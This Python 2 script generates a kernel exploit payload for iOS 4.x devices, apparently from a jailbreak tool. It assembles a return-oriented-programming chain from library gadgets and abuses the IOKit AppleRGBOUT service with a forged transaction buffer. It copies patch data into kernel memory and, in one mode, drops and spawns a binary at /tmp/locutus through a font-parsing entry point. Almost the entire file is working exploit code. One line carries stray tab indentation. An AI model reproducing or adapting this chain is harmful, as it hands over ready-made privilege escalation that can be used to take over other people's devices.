#!/opt/local/bin/python2.6
import sys, base64, shlex, zlib, os
import dmini
from world1 import *
import goo
import cPickle as pickle

MAP_ANON = 0x1000
MAP_SHARED = 0x0001

O_WRONLY = 0x0001
O_CREAT  = 0x0200
O_TRUNC  = 0x0400

PROT_READ = 1
PROT_WRITE = 2
PROT_EXEC = 4

mode, version, cachefile, kernfile, patchfile, kcode, outfile = sys.argv[1:8]
four_dot_three = '4.3' in version
cachefiles = [cachefile] + sys.argv[8:]
ipad2 = len(cachefiles) > 1

assert mode in ['dejavu', 'untether']
patchfp = open(patchfile)

lib_paths = set(['/usr/lib/libSystem.B.dylib'])
def add_lib(conn, short, path):
    conn.add_lib(short, path)
    lib_paths.add(path)

debugging = True

def dbg_result():
    if debugging:
        result, resultp = stackunkpair()
        store_r0_to(resultp)
        back = sys._getframe().f_back

        funcall('_fprintf', dmini.cur.sym('___stderrp'), ptr('Result for %s:%d was %%08x\n' % (back.f_code.co_filename, back.f_lineno), True), result, load_r0=True)

dmini.init(kernfile, False)

sysent = dmini.cur.find('- 00 10 86 00') + 4

code_addr = 0x80000400
weirdfile = dmini.Connection(kcode, rw=True).relocate(dmini.cur, code_addr).nth_segment(0).data()[:-8]
count = 0
stuff = ''
while True:
    namelen = patchfp.read(4)
    if namelen == '': break
    name = patchfp.read(struct.unpack('I', namelen)[0])
    addr, = struct.unpack('I', patchfp.read(4))
    data = patchfp.read(struct.unpack('I', patchfp.read(4))[0])
    if addr == 0 or len(data) == 0 or name.startswith('-'): # before the fact only
        continue
    stuff += I(addr, len(data)) + data
    count += 1
weirdfile = pointed(weirdfile + I(sysent, count) + stuff)

def mov_r0_r6():
    set_fwd('PC', dmini.cur.find('+ 30 46 70 bd'))
    exhaust_fwd('R4', 'R5', 'R6')
    heapadd(fwd('R4'), fwd('R5'), fwd('R6'), fwd('PC'))

def str_r7_sp_856():
    set_fwd('PC', dmini.cur.find('+ d6 97 e9 bd'))
    exhaust_fwd('R0', 'R3', 'R5', 'R6', 'R7')
    heapadd(fwd('R0'), fwd('R3'), fwd('R5'), fwd('R6'), fwd('R7'), fwd('PC'))

def seek_kernel_ldm(reg):
    s = chr(0x90 | reg) + chr(0xe8)
    # r0, r7 out; sp, pc in
    seg = 0
    while True:
        data = dmini.cur.nth_segment(seg).data()
        i = 1
        while True:
            i = data.find(s, i + 1)
            if i == -1: break
            if (i & 3) != 2: continue
            insn, = struct.unpack('I', data[i-2:i+2])
            regs = [b for (n, b) in enumerate(['R0', 'R1', 'R2', 'R3', 'R4', 'R5', 'R6', 'R7', 'R8', 'R9', 'R10', 'R11', 'R12', 'SP', 'LR', 'PC']) if (insn & (1 << n))]
            if 'SP' not in regs or 'PC' not in regs: continue
            if 'R0' in regs or 'R7' in regs: continue
            # got it
            return (dmini.cur.nth_segment(seg).start + i - 2, regs)
        
        seg += 1


# 12_41, 31_41, 31_421: R6
kernel_ldm, kernel_ldm_regs = seek_kernel_ldm(11 if four_dot_three else 6)
#kernel_ldm = 0xdeadbeef
init(*kernel_ldm_regs)

#set_fwd('PC', 0xdeadbeee); heapadd(fwd('PC'))
obj = code_addr - 4
    
m = pointed('')
set_fwd('SP', pointer(m))
heapadd(m)
mov_r0_r6()
store_r0_to(obj)
str_r7_sp_856()

make_r4_avail()
funcall('_copyin', pointer(weirdfile), code_addr, len(weirdfile))
funcall('_flush_dcache', code_addr, len(weirdfile), 0)
set_fwd('R4', obj)
set_fwd('PC', code_addr)


kstuff = finalize(None, must_be_simple=False, should_heapdump=False)
kstuff += '\0'*(856 + 0x38 + 4 - len(kstuff)) # xxx offset

def set_cache(cachefile):
    conn = dmini.Connection(cachefile, True)
    if mode == 'dejavu':
        add_lib(conn, 'ft', '/System/Library/Frameworks/CoreGraphics.framework/Resources/libCGFreetype.A.dylib')
        add_lib(conn, 'libz', '/usr/lib/libz.dylib')
    add_lib(conn, 'iokit', '/System/Library/Frameworks/IOKit.framework/Versions/A/IOKit')
    return conn
dmini.cur = set_cache(cachefile)
targets = [None]

if four_dot_three:
    def wrap(self, num):
        if (num & 0xf0000000) == 0x30000000:
            return reloc(3, num, alignment=0x1000)
        else:
            return num
    dmini.Connection.wrap = wrap

def do_main_thing():
    task_self, task_self_p = stackunkpair()
    zlocutusp, zlocutuspp = stackunkpair()
    matching, matchingp = stackunkpair()
    locutusp, locutuspp = stackunkpair()
    fd, fdp = stackunkpair()

    make_avail()

    if mode == 'dejavu':
        load_r0_from(reloc(0xe, 0x558))
        load_r0_r0()
        store_r0_to(zlocutuspp)
    else:
        pass
        #osversion, osversion_size = ptr('\0'*64), ptrI(64)
        #funcall('_sysctlbyname', ptr('kern.osversion', True), osversion, osversion_size, 0, 0); dbg_result()
        #funcall('_strcmp', osversion, ptr('8J2', True))
        #zero, nonzero = cmp_r0_0_branch()
        #come_from(zero)
    
    dbg_result()

    funcall('_mach_task_self')
    store_r0_to(task_self_p)

    set_r0_to(kstuffp); dbg_result()

    # The manpage says this returns EINVAL, but in fact the kernel handles it.
    funcall('_mlock', kstuffp, len(kstuff)); dbg_result()

    if mode == 'untether':
        # XXX is this necessary? it's from star
        funcall('iokit._IOKitWaitQuiet', 0, 0)#ptrI(0, 0, 0))

    funcall('iokit._IOServiceMatching', AppleRGBOUT)
    store_r0_to(matchingp)
    funcall('iokit._IOServiceGetMatchingService', 0, matching)
    funcall('iokit._IOServiceOpen', None, task_self, 0, connect); dbg_result()

    # XXX In Safari, I need to kill this
    funcall('iokit._IOConnectCallScalarMethod', connect, 21, fail_callback, 2, 0, 0, load_r0=True); dbg_result()

    funcall('iokit._IOConnectCallStructMethod', connect, 5, transactionp, len(transaction), 0, 0, load_r0=True); dbg_result()
    #funcall('_sleep', 1000)
    #dbg_result(); funcall('_abort')


    # do some housekeeping
    # (but don't bother if we're going to exec)
    if mode == 'dejavu':
        funcall('iokit._IOServiceClose', connect, load_r0=True)
        funcall('_munlock', kstuffp, len(kstuff)); dbg_result()

        # the boring stuff

        funcall('_malloc', reloc(0xa, 0))
        store_r0_to(locutuspp)
        funcall('libz._uncompress', None, dest_len_p, zlocutusp, reloc(0xb, 0)); dbg_result()
        funcall('_open', locutus_str, O_WRONLY | O_CREAT | O_TRUNC, 0755)
        store_r0_to(fdp)
        #dbg_result()
        funcall('_write', None, locutusp, reloc(0xa, 0))
        dbg_result()
        funcall('_close', fd)
        dbg_result()
        funcall('_posix_spawn', 0, locutus_str, 0, 0, zerop, zerop)
        dbg_result()

        set_r0_to(1337)
        fancy_set_sp_to(reloc(0xe, 0x60c)) # offset determined by experiment
    else:
        lunchd = ptr('/boot/mount_nulls', True)
        funcall('_execl', lunchd, lunchd, 0)
        funcall('_exit', 1)

if mode == 'untether':
    init('R8', 'R10', 'R11', 'R4', 'R5', 'R6', 'R7', 'PC')
elif mode == 'dejavu':
    init('R4', 'R5', 'PC')

kstuffp = ptr(kstuff + '\0'*32)
zerop = ptrI(0)
AppleRGBOUT = ptr('AppleRGBOUT', True)
connect = ptrI(0)
fail_callback = ptrI(0xeeeeeeee, 0xeeeeeeee)

transaction = troll_string('\x00' * (0xd8 if four_dot_three else 0x8c))
transaction[0:4] = transaction[4:8] = I(0xeeeeeeee)
transaction[8:0xc] = I(kstuffp) # surface saved in r11
transaction[0x58:0x5c] = I(kernel_ldm)
if four_dot_three:
    transaction[0xb8:0xbc] = I(6) # run iterations 1 and 2 (first loop bails at 1)
else:
    transaction[0x70:0x74] = I(6)
transaction = simplify(transaction)
transactionp = ptr(transaction)
if mode == 'dejavu':
    dest_len_p = ptrI(reloc(0xa, 0))
    locutus_str = ptr('/tmp/locutus', True)

if not ipad2:
    make_r7_avail()
    set_sp_to_sp()
    do_main_thing()
else:
    cases = {}

    old_fwds = goo.fwds

    for cachefile in cachefiles:
        print cachefile
        dmini.cur = set_cache(cachefile)
        old_heap, goo.heap = goo.heap, troll_string()
        come_from_load_sp_r0('')
        do_main_thing()
        new_heap, goo.heap = goo.heap, old_heap
        stderrp = dmini.cur.sym('___stderrp')
		  assert not cases.has_key(stderrp)
        cases[stderrp] = new_heap

    old_fa = dmini.data.b_find_anywhere
    def new_fa(binary, pattern, align, flags):
        result = dmini.data.find_data(dmini.data.b_macho_segrange(dmini.cur.binaries['ft'], '__TEXT'), pattern, align, flags)
        return result

    dmini.data.b_find_anywhere = new_fa
    
    goo.fwds = old_fwds
    
    make_r7_avail()
    set_sp_to_sp()

    make_avail()
    switch_ptr = dmini.cur.sym('ft.___stderrp', 'imported')

    crap = map_switch(switch_ptr, cases)
    load_sp_r0()
    heapadd(crap)
    
    dmini.data.b_find_anywhere = old_fa
        
        
goo.sheap.append(weirdfile)

if mode == 'dejavu':
    final = pad(finalize(reloc(0xd, 0), should_heapdump=False), 4)

    #.long 0xbd64b062
    #.long 0xbd60b060
    #.long 0xbd30b050
    #.long 0xbd49b060
    
    # add sp, #392; pop {r2, r5, r6, pc}
    parse_callback = reloc_value(dmini.cur.find('+ 50 b0 30 bd'))
    actual_parse_callback = reloc_value(dmini.cur.sym('ft._T1_Parse_Glyph', 'private'))

    final = final.unpack()

    open(outfile, 'w').write(pickle.dumps({'parse_callback': parse_callback, 'actual_parse_callback': actual_parse_callback, 'final': final}))
else:
    # for two.py
    initializer = dmini.cur.find('+ 5f 13 77 47') # asrs r7, r3, #13; bx lr
    #TODO test on 4.1 dmini.cur.find('+ 97 0a 72 47')
    init_sp = 0x10031000
    address = 0x8000

    final = finalize(address)
    #heapdump(final)
    open(outfile, 'w').write(pickle.dumps({'segment': final, 'initializer': initializer, 'init_sp': init_sp, 'rop_address': address, 'libs': lib_paths, 'dylib': False}))
